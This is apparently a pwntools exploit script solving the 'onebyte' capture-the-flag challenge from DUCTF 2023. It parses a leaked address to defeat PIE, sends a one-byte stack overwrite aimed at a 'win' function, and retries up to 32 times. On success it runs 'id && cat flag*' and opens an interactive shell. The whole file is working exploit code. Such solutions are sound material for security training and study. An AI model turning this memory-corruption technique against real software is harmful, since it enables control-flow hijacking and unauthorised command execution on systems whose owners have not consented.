#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./onebyte", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc 2023.ductf.dev 30018"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
old = elf.address
for i in range(0x20):
    elf.address = old
    io = start()

    win = elf.symbols["win"]

    io.recvuntil(b"junk: 0x")

    elf.address = int(io.recvline(keepends=False), 16) - elf.symbols["init"]
    log.info(f"{elf.address=:#x}")

    payload = b"A" * 0x10 + p8(elf.symbols["win"] & 0xff)
    payload = p32(elf.symbols["win"]) * 4 + p8(0x80)
    io.sendafter(b"Your turn: ", payload)

    io.sendline(b"id && cat flag*")
    r = io.recvall(timeout=1)
    if len(r) != 0 and b"Free junk" not in r:
        print(r)
        io.interactive()
        quit()
    io.close()
